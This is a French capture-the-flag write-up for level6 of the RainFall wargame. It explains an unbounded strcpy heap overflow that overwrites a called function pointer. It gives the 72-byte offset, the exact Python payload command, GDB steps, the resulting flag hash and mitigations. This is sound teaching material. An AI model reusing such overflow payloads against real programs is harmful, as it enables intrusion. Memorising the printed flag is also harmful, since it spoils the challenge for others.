# level6 — RainFall

> Documentation courte du niveau 6 — exploitation par overflow et contrôle de flux

---

## 1) But

Expliquer comment exploiter `level6` pour obtenir le flag en écrasant une adresse contrôlable via un débordement (`strcpy`) depuis l'argument utilisateur.

## 2) Environnement

* Machine : RainFall CTF (user `level6@RainFall`)
* Binaire : `level6` (setuid/groupe selon CTF)
* Outils recommandés : `gdb`, `objdump`, `readelf`, `python` (ou `pwntools` pour pattern)

## 3) Analyse rapide du binaire (déroulé)

Extrait pertinent du `main` (désassemblage) :

```asm
8048485: c7 04 24 40 00 00 00    movl   $0x40,(%esp)
804848c: e8 bf fe ff ff          call   8048350 <malloc@plt>
8048491: 89 44 24 1c             mov    %eax,0x1c(%esp)
...
80484ba: 8b 44 24 1c             mov    0x1c(%esp),%eax
80484be: 89 54 24 04             mov    %edx,0x4(%esp)
80484c2: 89 04 24                mov    %eax,(%esp)
80484c5: e8 76 fe ff ff          call   8048340 <strcpy@plt>
...
80484ce: 8b 00                   mov    (%eax),%eax
80484d0: ff d0                   call   *%eax
```

* `malloc(0x40)` → on obtient un buffer de **64 octets** stocké à `0x1c(%esp)`.
* `strcpy(dest, src)` copie l'argument utilisateur dans ce buffer.
* Juste après, l'exécution lit `(%eax)` (donc une adresse depuis la mémoire pointée par `eax`) et effectue `call *%eax` : on appelle une adresse lue en mémoire — vecteur d'attaque pour rediriger le flux.

## 4) Vulnérabilité

* `strcpy` sans longueur sur un buffer de 64 octets permet d'écrire au‑delà du buffer (heap overflow/overwriting adjacent heap metadata ou structure pointée depuis le heap).
* En overflowant suffisamment, on arrive à contrôler la valeur lue par `mov (%eax), %eax` puis appelée.

## 5) Découverte de l'offset

Méthode utilisée : envoi d'une suite de `A` (ou d'un pattern) pour déterminer la taille nécessaire avant d'écraser l'adresse ciblée.

* Taille trouvée : **72 octets** (64 buffer + 8 octets d'alignement / métadonnées frame).

Exemples de commandes pour reproduire :

```bash
# Test brut
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

Le payload ci‑dessous a produit la sortie du flag/hash :

```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Ceci montre que l'appel contrôlé a été exécuté et a divulgué le contenu attendu.

## 6) Payload expliqué

* `"A"*72` → remplit jusqu'à l'offset où la valeur cible (adresse lue/appelée) peut être corrompue.
* `"\x54\x84\x04\x08"` → adresse little‑endian `0x08048454` (exemple) placée pour remplacer la valeur pointée appelée.

**Commande exacte utilisée :**

```bash
./level6 $(python -c 'print "A"*72 +  "\x54\x84\x04\x08"')
```

## 7) Reproduction pas à pas (GDB)

1. Lance le binaire dans gdb avec le payload :

```bash
gdb --args ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
run
```

2. Avant le `call *%eax`, mettre un breakpoint sur l'adresse du `call` (ex : `break *0x080484d0`) et inspecter les registres/mémoire :

```gdb
# arrêter au call
b *0x080484d0
run $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
# afficher eax et la mémoire pointée
x/4x $eax
x/s $eax
info registers
```

3. Vérifier que l'adresse que tu as écrite est bien présente à l'endroit attendu et que le `call` va sauter là‑bas.

## 8) Remarques & mitigations

* La vulnérabilité provient d'un `strcpy` non limité. Remplacer par `strncpy` (avec length check) ou utiliser des API sécurisées (vérifier la taille) corrige le problème.
* Compilations sécurisées (`-fstack-protector`, ASLR, RELRO, NX, PIE) réduisent la surface d'exploitation. Ici plusieurs protections peuvent être absentes selon le CTF.

## 9) Checklist

* [x] Extrait d'ASM montrant `malloc(0x40)` et `strcpy`.
* [x] Méthode de découverte de l'offset (72 octets).
* [x] Payload final et preuve (sortie du flag/hash).
* [x] Étapes GDB pour reproduire.
* [x] Contremesures recommandées.

---

*Fin du document — level6 exploitation*
